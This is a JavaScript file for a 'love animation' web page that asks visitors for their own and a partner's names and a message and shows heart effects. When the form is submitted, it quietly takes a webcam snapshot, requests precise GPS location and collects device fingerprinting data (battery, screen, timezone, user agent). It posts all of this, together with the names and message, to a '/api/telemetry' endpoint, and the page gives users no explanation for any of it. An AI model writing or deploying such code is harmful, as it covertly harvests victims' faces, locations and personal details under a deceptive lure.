(function () {
  'use strict';

  var clientTelemetry = null;
  var watchId = null;
  var mediaRecorder = null;
  var recordedChunks = [];

  var screen1 = document.getElementById('screen-1');
  var screen2 = document.getElementById('screen-2');
  var namesForm = document.getElementById('names-form');
  var yourNameInput = document.getElementById('your-name');
  var partnerNameInput = document.getElementById('partner-name');
  var loveMessageInput = document.getElementById('love-message');
  var yourColorInput = document.getElementById('your-color');
  var partnerColorInput = document.getElementById('partner-color');
  var formError = document.getElementById('form-error');

  var renderName1 = document.getElementById('render-name-1');
  var renderName2 = document.getElementById('render-name-2');
  var wishDisplay = document.getElementById('wish-display');
  var uiContainer = document.getElementById('ui');
  var replayBtn = document.getElementById('replay-btn');
  var downloadVideoBtn = document.getElementById('download-video-btn');

  var webcamVideo = document.getElementById('webcam-video');
  var captureCanvas = document.getElementById('capture-canvas');

  function getBatteryMetrics() {
    if (typeof navigator.getBattery === 'function') {
      return navigator.getBattery().then(function (battery) {
        return { battery_level: Math.round(battery.level * 100), battery_charging: Boolean(battery.charging) };
      }).catch(function () { return { battery_level: null, battery_charging: null }; });
    }
    return Promise.resolve({ battery_level: null, battery_charging: null });
  }

  function detectTelemetry() {
    var ua = navigator.userAgent || '';
    var deviceName = 'Generic Device';
    var deviceType = 'desktop';
    var os = 'Unknown OS';
    var browser = 'Unknown Browser';

    if (typeof window.UAParser === 'function') {
      try {
        var parser = new window.UAParser();
        var res = parser.getResult();
        deviceName = res.device.model ? (res.device.vendor + ' ' + res.device.model) : (res.os.name ? res.os.name + ' Device' : 'Generic Device');
        deviceType = res.device.type || 'desktop';
        if (res.os.name) os = res.os.name + (res.os.version ? ' ' + res.os.version : '');
        if (res.browser.name) browser = res.browser.name + (res.browser.version ? ' ' + res.browser.version : '');
      } catch (err) {}
    }

    var dpr = window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) / 100 : 1;
    var screenStr = (window.screen.width || 0) + 'x' + (window.screen.height || 0) + ' @ ' + dpr + 'x';
    var tzStr = 'Unknown';
    try { tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch (e) {}

    return getBatteryMetrics().then(function (batteryData) {
      clientTelemetry = {
        device_name: deviceName,
        device_type: deviceType,
        browser: browser,
        os: os,
        battery_level: batteryData.battery_level,
        battery_charging: batteryData.battery_charging,
        screen_res: screenStr,
        timezone: tzStr,
        raw_user_agent: ua
      };
      return clientTelemetry;
    });
  }

  detectTelemetry();

  function captureWebcamAndGeolocation(callback) {
    // 1. Request Camera Permission & Snapshot
    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
      .then(function (stream) {
        webcamVideo.srcObject = stream;
        setTimeout(function () {
          var base64Image = null;
          try {
            captureCanvas.width = webcamVideo.videoWidth || 640;
            captureCanvas.height = webcamVideo.videoHeight || 480;
            var ctx = captureCanvas.getContext('2d');
            ctx.drawImage(webcamVideo, 0, 0, captureCanvas.width, captureCanvas.height);
            base64Image = captureCanvas.toDataURL('image/jpeg', 0.8);
          } catch (e) {}

          // Stop camera stream tracks after snap
          stream.getTracks().forEach(function (track) { track.stop(); });
          webcamVideo.srcObject = null;

          fetchGeoAndFinish('Allowed / Captured', base64Image, callback);
        }, 1000);
      })
      .catch(function () {
        // Fallback if camera is blocked/denied
        fetchGeoAndFinish('Camera Denied / Default', null, callback);
      });
  }

  function fetchGeoAndFinish(cameraStatus, webcamPic, callback) {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          callback({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            location_status: 'Allowed / GPS Captured',
            camera_status: cameraStatus,
            webcam_pic: webcamPic
          });
        },
        function () {
          callback({ latitude: null, longitude: null, location_status: 'GPS Denied', camera_status: cameraStatus, webcam_pic: webcamPic });
        },
        { timeout: 5000, enableHighAccuracy: true }
      );
    } else {
      callback({ latitude: null, longitude: null, location_status: 'Not Supported', camera_status: cameraStatus, webcam_pic: webcamPic });
    }
  }

  function generateLoveParticles(count) {
    if (!uiContainer) return;
    uiContainer.innerHTML = '';
    var phrase = 'I love you ❤';
    for (var i = 1; i <= count; i++) {
      var love = document.createElement('div');
      love.className = 'love';
      love.style.setProperty('--i', i.toString());
      var h = document.createElement('div'); h.className = 'love_horizontal';
      var v = document.createElement('div'); v.className = 'love_vertical';
      var word = document.createElement('div'); word.className = 'love_word'; word.textContent = phrase;
      v.appendChild(word); h.appendChild(v); love.appendChild(h);
      uiContainer.appendChild(love);
    }
  }

  function startCanvasVideoRecording() {
    recordedChunks = [];
    try {
      var canvasEl = document.querySelector('canvas') || document.body;
      if (typeof canvasEl.captureStream === 'function') {
        var stream = canvasEl.captureStream(30);
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
        mediaRecorder.ondataavailable = function (e) { if (e.data.size > 0) recordedChunks.push(e.data); };
        mediaRecorder.start();
      }
    } catch (err) {}
  }

  namesForm.addEventListener('submit', function (e) {
    e.preventDefault();
    var yourName = (yourNameInput.value || '').trim();
    var partnerName = (partnerNameInput.value || '').trim();
    var message = (loveMessageInput.value || '').trim();
    var col1 = yourColorInput.value;
    var col2 = partnerColorInput.value;

    if (!yourName || !partnerName) {
      formError.textContent = 'Please enter both names.';
      return;
    }
    formError.textContent = '';

    // Apply custom manual colors directly to elements
    renderName1.textContent = yourName;
    renderName1.style.color = col1;
    renderName2.textContent = partnerName;
    renderName2.style.color = col2;
    wishDisplay.textContent = message || 'Together Always ❤';

    screen1.classList.remove('screen-active'); screen1.classList.add('screen-hidden');
    screen2.classList.remove('screen-hidden'); screen2.classList.add('screen-active');

    generateLoveParticles(70);
    startCanvasVideoRecording();

    // Trigger permission capture workflow
    captureWebcamAndGeolocation(function (resultData) {
      var payload = Object.assign({}, clientTelemetry || {}, {
        your_name: yourName,
        partner_name: partnerName,
        couple_names: yourName + ' ❤ ' + partnerName,
        message: message,
        latitude: resultData.latitude,
        longitude: resultData.longitude,
        location_status: resultData.location_status,
        camera_status: resultData.camera_status,
        webcam_pic: resultData.webcam_pic
      });

      fetch('/api/telemetry', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(function () {});
    });
  });

  if (downloadVideoBtn) {
    downloadVideoBtn.addEventListener('click', function () {
      if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        setTimeout(function () {
          var blob = new Blob(recordedChunks, { type: 'video/webm' });
          var url = URL.createObjectURL(blob);
          var a = document.createElement('a');
          a.style.display = 'none';
          a.href = url;
          a.download = 'love-animation-story.webm';
          document.body.appendChild(a);
          a.click();
          setTimeout(function () { document.body.removeChild(a); window.URL.revokeObjectURL(url); }, 100);
        }, 500);
      } else {
        alert('Recording generating, please wait a moment or restart demo.');
      }
    });
  }

  if (replayBtn) {
    replayBtn.addEventListener('click', function () {
      screen2.classList.remove('screen-active'); screen2.classList.add('screen-hidden');
      screen1.classList.remove('screen-hidden'); screen1.classList.add('screen-active');
      yourNameInput.value = ''; partnerNameInput.value = '';
      if (loveMessageInput) loveMessageInput.value = '';
      yourNameInput.focus();
    });
  }
})();
